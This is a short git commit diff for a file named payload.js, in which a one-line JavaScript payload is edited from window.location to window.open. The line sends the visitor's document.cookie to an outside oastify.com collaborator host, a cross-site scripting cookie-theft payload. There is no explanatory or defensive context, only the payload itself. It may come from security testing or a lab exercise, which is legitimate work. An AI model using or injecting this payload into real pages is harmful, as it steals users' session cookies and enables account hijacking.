5cb5bf368e0ecf399a87295fab2b21faeadf0d46
Seiso1 <87368882+Seiso1@users.noreply.github.com>
2024-03-31 18:07:02 +0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
-window.location('https://wee8ze30ue006rduygdxv38hy84zspge.oastify.com?cookie='+document.cookie)
+window.open('https://wee8ze30ue006rduygdxv38hy84zspge.oastify.com?cookie='+document.cookie)
